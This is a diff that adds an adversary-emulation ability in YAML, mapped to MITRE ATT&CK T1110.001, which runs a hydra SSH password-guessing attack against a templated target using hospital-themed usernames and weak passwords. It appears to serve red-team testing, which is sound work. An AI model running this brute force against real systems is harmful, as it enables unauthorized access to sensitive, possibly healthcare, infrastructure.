@@ -1,0 +1,28 @@
+- id: "initial-access-brute-ssh"
+  name: "SSH Brute Force"
+  description: "Attempts credential stuffing against SSH services."
+  tactic: "initial-access"
+  technique:
+    attack_id: "T1110.001"
+    name: "Brute Force: Password Guessing"
+  platforms:
+    linux:
+      sh:
+        command: |
+          TARGET="#{target.dmz.ip}"; OUTDIR="/tmp/recon"; mkdir -p "$OUTDIR"; cat > "$OUTDIR/users.txt" << 'EOF'
+          admin
+          nurse
+          doctor
+          reception
+          sysadmin
+          backup
+          EOF
+          cat > "$OUTDIR/passwords.txt" << 'EOF'
+          hospital2024
+          admin123
+          password
+          Welcome1
+          Healthcare!
+          P@ssw0rd
+          EOF
+          echo "[*] Starting SSH brute force against $TARGET..."; hydra -L "$OUTDIR/users.txt" -P "$OUTDIR/passwords.txt" "$TARGET" ssh -t 4 -o "$OUTDIR/ssh_brute_results.txt" 2>/dev/null; echo "[+] Brute force complete"; cat "$OUTDIR/ssh_brute_results.txt"
